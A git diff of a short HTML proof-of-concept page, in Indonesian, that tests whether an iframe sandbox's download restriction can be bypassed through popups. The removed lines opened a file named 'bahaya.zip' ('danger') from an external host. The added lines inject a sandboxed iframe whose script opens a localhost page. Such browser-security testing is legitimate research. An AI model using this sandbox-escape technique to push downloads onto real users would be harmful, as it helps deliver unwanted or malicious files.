@@ -1,32 +1,34 @@
 <!DOCTYPE html>
 
 <html lang="id">
-
 <head>
     <meta charset="UTF-8">
-    <title>PoC Utaa</title>
+    <title>PoC Allow-Downloads Bypass Test</title>
 </head>
 
 <body>
-    <h2>Sandbox iframe test (allow-scripts + allow-popups)</h2>
-<iframe 
-    id="f"
-    src="https://form349.vercel.app/githubreps/download.html"
-    sandbox="allow-scripts allow-popups"
-    width="100%" 
-    height="200px" 
-    style="border: 2px dashed red;">
-</iframe>
+    <h2>Sandbox allow-popups test (button trigger)</h2>
 
-<br><br>
-
-<button onclick="triggerPopup()">Trigger Popup (User Gesture)</button>
+<button onclick="runExploit()">Klik untuk trigger</button>
 
 <script>
-    function triggerPopup() {
-        window.open("https://form349.vercel.app/bahaya.zip", "_blank");
+    function runExploit() {
+        let f = document.createElement('iframe');
+        f.sandbox = 'allow-popups';
+        
+        f.srcdoc = `
+            <button onclick="go()">Click me</button>
+            <script>
+                function go(){
+                    window.open("http://localhost:8000", "_blank");
+                }
+            <\/script>
+        `;
+
+        document.body.appendChild(f);
+
+        console.log("Iframe injected");
     }
 </script>
 </body>
-
 </html>
